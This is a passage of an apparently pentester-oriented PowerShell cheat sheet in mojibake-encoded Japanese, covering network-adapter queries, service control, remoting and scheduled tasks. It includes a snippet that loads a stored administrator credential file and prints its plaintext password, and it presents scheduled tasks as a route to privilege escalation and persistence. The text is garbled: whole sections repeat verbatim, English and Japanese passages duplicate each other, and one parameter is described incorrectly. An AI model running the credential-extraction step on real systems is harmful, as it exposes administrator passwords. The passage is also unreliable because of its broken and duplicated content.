### Get-NetAdapterSriov

`Get-NetAdapterSriov`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®SR-IOVï¼ˆSingle Root I/O Virtualizationï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterSriov
```

### Get-NetAdapterVmq

`Get-NetAdapterVmq`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®VMQï¼ˆVirtual Machine Queueï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterVmq
```

### Get-NetAdapterVrss

`Get-NetAdapterVrss`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®VRSSï¼ˆVirtual Receive Side Scalingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterVrss
```

### Get-NetAdapterWakeOnMagicPacket

`Get-NetAdapterWakeOnMagicPacket`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚¸ãƒƒã‚¯ãƒ‘ã‚±ãƒƒãƒˆã«ã‚ˆã‚‹ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnMagicPacket
```

### Get-NetAdapterWakeOnPattern

`Get-NetAdapterWakeOnPattern`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã‚ˆã‚‹ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnPattern
```

### Get-NetAdapterWakeOnPatternList

`Get-NetAdapterWakeOnPatternList`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnPatternList
```

### Get-NetAdapterWoL

`Get-NetAdapterWoL`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®Wake-on-LANï¼ˆWoLï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWoL
```

### Get-NetAdapterStatistics

`Get-NetAdapterStatistics`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®çµ±è¨ˆæƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterStatistics
```

### Get-NetAdapterAdvancedProperty

`Get-NetAdapterAdvancedProperty`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®è©³ç´°ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterAdvancedProperty
```

### Get-NetAdapterBinding

`Get-NetAdapterBinding`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterBinding
```

### Get-NetAdapterChecksumOffload

`Get-NetAdapterChecksumOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚§ãƒƒã‚¯ã‚µãƒ ã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterChecksumOffload
```

### Get-NetAdapterEncapsulatedPacketTaskOffload

`Get-NetAdapterEncapsulatedPacketTaskOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã‚«ãƒ—ã‚»ãƒ«åŒ–ãƒ‘ã‚±ãƒƒãƒˆã‚¿ã‚¹ã‚¯ã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterEncapsulatedPacketTaskOffload
```

### Get-NetAdapterIPsecOffload

`Get-NetAdapterIPsecOffload`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®IPsecã‚ªãƒ•ãƒ­ãƒ¼ãƒ‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterIPsecOffload
```

### Get-NetAdapterLso

`Get-NetAdapterLso`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®Lsoï¼ˆLarge Send Offloadï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterLso
```

### Get-NetAdapterPacketDirect

`Get-NetAdapterPacketDirect`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®PacketDirectã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterPacketDirect
```

### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®é›»æºç®¡ç†ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterPowerManagement
```

### Get-NetAdapterQos

`Get-NetAdapterQos`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®QoSï¼ˆQuality of Serviceï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterQos
```

### Get-NetAdapterRdma

`Get-NetAdapterRdma`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RDMAï¼ˆRemote Direct Memory Accessï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRdma
```

### Get-NetAdapterRsc

`Get-NetAdapterRsc`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RSCï¼ˆReceive Segment Coalescingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRsc
```

### Get-NetAdapterRss

`Get-NetAdapterRss`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®RSSï¼ˆReceive Side Scalingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterRss
```

### Get-NetAdapterSriov

`Get-NetAdapterSriov`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®SR-IOVï¼ˆSingle Root I/O Virtualizationï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterSriov
```

### Get-NetAdapterVmq

`Get-NetAdapterVmq`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®VMQï¼ˆVirtual Machine Queueï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterVmq
```

### Get-NetAdapterVrss

`Get-NetAdapterVrss`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®VRSSï¼ˆVirtual Receive Side Scalingï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterVrss
```

### Get-NetAdapterWakeOnMagicPacket

`Get-NetAdapterWakeOnMagicPacket`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒã‚¸ãƒƒã‚¯ãƒ‘ã‚±ãƒƒãƒˆã«ã‚ˆã‚‹ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnMagicPacket
```

### Get-NetAdapterWakeOnPattern

`Get-NetAdapterWakeOnPattern`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã‚ˆã‚‹ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnPattern
```

### Get-NetAdapterWakeOnPatternList

`Get-NetAdapterWakeOnPatternList`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®ã‚¦ã‚§ã‚¤ã‚¯ã‚¢ãƒƒãƒ—ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWakeOnPatternList
```

### Get-NetAdapterWoL

`Get-NetAdapterWoL`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ã®Wake-on-LANï¼ˆWoLï¼‰ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapterWoL
```
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## ã‚µãƒ¼ãƒ“ã‚¹

### PowerShell Remoting

PowerShellãƒªãƒ¢ãƒ¼ãƒˆæ“ä½œã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã®Windowsãƒã‚·ãƒ³ã«å¯¾ã—ã¦PowerShellã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚·ãƒ³ã«æ¥ç¶šã—ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

```powershell
Enter-PSSession -ComputerName <target> -Credential <credentials>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§è¡¨ç¤º

ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚·ãƒ³ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-Service
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®åœæ­¢

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’åœæ­¢ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Stop-Service -Name <service_name>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®é–‹å§‹

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’é–‹å§‹ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Start-Service -Name <service_name>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®å†èµ·å‹•

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Restart-Service -Name <service_name>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®ç„¡åŠ¹åŒ–

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Set-Service -Name <service_name> -StartupType Disabled
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®æœ‰åŠ¹åŒ–

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æœ‰åŠ¹åŒ–ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Set-Service -Name <service_name> -StartupType Automatic
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®å‰Šé™¤

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Remove-Service -Name <service_name>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®è¨­å®šå¤‰æ›´

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã®è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Set-Service -Name <service_name> -<setting_name> <value>
```

### ã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã®ç¢ºèª

ç‰¹å®šã®ã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-Service -Name <service_name> | Select-Object Status
```
```
Get-Service
```
## ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã‚’èª¬æ˜ã—ã¾ã™ã€‚

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

ä¸Šè¨˜ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€`ConvertTo-SecureString`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’ä½œæˆã—ã¾ã™ã€‚`-String`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã¯ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã«å¤‰æ›ã™ã‚‹å…ƒã®æ–‡å­—åˆ—ã‚’æŒ‡å®šã—ã¾ã™ã€‚`-AsPlainText`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã§ä¿å­˜ã™ã‚‹ã“ã¨ã‚’æŒ‡å®šã—ã¾ã™ã€‚`-Force`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€å¤‰æ›ã‚’å¼·åˆ¶ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

æ¬¡ã«ã€`[Runtime.InteropServices.Marshal]::SecureStringToBSTR`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’BSTRï¼ˆãƒã‚¤ãƒŠãƒªã‚¹ãƒˆãƒªãƒ³ã‚°ï¼‰ã«å¤‰æ›ã—ã¾ã™ã€‚ãã®å¾Œã€`[Runtime.InteropServices.Marshal]::PtrToStringAuto`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€BSTRã‚’æ–‡å­—åˆ—ã«å¤‰æ›ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå–å¾—ã•ã‚Œã¾ã™ã€‚

ã“ã®æ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how scheduled tasks work can be beneficial for privilege escalation and persistence.

ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã¯ã€ç‰¹å®šã®æ™‚é–“ã‚„é–“éš”ã§ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã®Windowsã®å¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ã€‚ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã¨ã—ã¦ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ä»•çµ„ã¿ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯ç‰¹æ¨©ã®æ˜‡æ ¼ã‚„æŒç¶šæ€§ã«å½¹ç«‹ã¡ã¾ã™ã€‚

### Viewing Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®è¡¨ç¤º

To view the list of scheduled tasks on a Windows system, you can use the `schtasks` command in PowerShell. This command allows you to list, create, modify, and delete scheduled tasks.

Windowsã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€PowerShellã®`schtasks`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ä¸€è¦§è¡¨ç¤ºã€ä½œæˆã€å¤‰æ›´ã€å‰Šé™¤ãŒã§ãã¾ã™ã€‚

To view all the scheduled tasks, run the following command:

ã™ã¹ã¦ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```powershell
schtasks /query /fo LIST /v
```

This will display detailed information about each scheduled task, including the task name, status, triggers, and actions.

ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¿ã‚¹ã‚¯åã€ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã€ãƒˆãƒªã‚¬ãƒ¼ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãªã©ã€å„ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®è©³ç´°æƒ…å ±ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

### Creating Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ä½œæˆ

To create a new scheduled task, you can use the `schtasks` command with the `/create` option. You will need administrative privileges to create a scheduled task.

æ–°ã—ã„ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€`schtasks`ã‚³ãƒãƒ³ãƒ‰ã«`/create`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€ç®¡ç†è€…æ¨©é™ãŒå¿…è¦ã§ã™ã€‚

Here is an example command to create a scheduled task that runs a PowerShell script every day at 9:00 AM:

ä»¥ä¸‹ã¯ã€æ¯æ—¥åˆå‰9æ™‚ã«PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’ä½œæˆã™ã‚‹ä¾‹ã§ã™ã€‚

```powershell
schtasks /create /tn "MyTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Path\to\script.ps1" /sc daily /st 09:00
```

In this command, `/tn` specifies the task name, `/tr` specifies the command to be executed, `/sc` specifies the schedule frequency (daily in this case), and `/st` specifies the start time.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã§ã¯ã€`/tn`ã¯ã‚¿ã‚¹ã‚¯åã‚’æŒ‡å®šã—ã€`/tr`ã¯å®Ÿè¡Œã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’æŒ‡å®šã—ã€`/sc`ã¯ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã®é »åº¦ã‚’æŒ‡å®šã—ã¾ã™ï¼ˆã“ã®å ´åˆã¯æ¯æ—¥ï¼‰ã€`/st`ã¯é–‹å§‹æ™‚é–“ã‚’æŒ‡å®šã—ã¾ã™ã€‚

### Modifying Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®å¤‰æ›´

To modify an existing scheduled task, you can use the `schtasks` command with the `/change` option. Again, administrative privileges are required to modify a scheduled task.

æ—¢å­˜ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ã€`schtasks`ã‚³ãƒãƒ³ãƒ‰ã«`/change`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ã€å†ã³ç®¡ç†è€…æ¨©é™ãŒå¿…è¦ã§ã™ã€‚

Here is an example command to modify the start time of a scheduled task:

ä»¥ä¸‹ã¯ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®é–‹å§‹æ™‚é–“ã‚’å¤‰æ›´ã™ã‚‹ä¾‹ã§ã™ã€‚

```powershell
schtasks /change /tn "MyTask" /st 10:00
```

In this command, `/tn` specifies the task name, and `/st` specifies the new start time.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã§ã¯ã€`/tn`ã¯ã‚¿ã‚¹ã‚¯åã‚’æŒ‡å®šã—ã€`/st`ã¯æ–°ã—ã„é–‹å§‹æ™‚é–“ã‚’æŒ‡å®šã—ã¾ã™ã€‚

### Deleting Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®å‰Šé™¤

To delete a scheduled task, you can use the `schtasks` command with the `/delete` option. Once again, administrative privileges are required to delete a scheduled task.

ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€`schtasks`ã‚³ãƒãƒ³ãƒ‰ã«`/delete`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€å†ã³ç®¡ç†è€…æ¨©é™ãŒå¿…è¦ã§ã™ã€‚

Here is an example command to delete a scheduled task:

ä»¥ä¸‹ã¯ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å‰Šé™¤ã™ã‚‹ä¾‹ã§ã™ã€‚

```powershell
schtasks /delete /tn "MyTask" /f
```

In this command, `/tn` specifies the task name, and `/f` forces the deletion without confirmation.

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã§ã¯ã€`/tn`ã¯ã‚¿ã‚¹ã‚¯åã‚’æŒ‡å®šã—ã€`/f`ã¯ç¢ºèªãªã—ã§å‰Šé™¤ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯

### ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹

```markdown
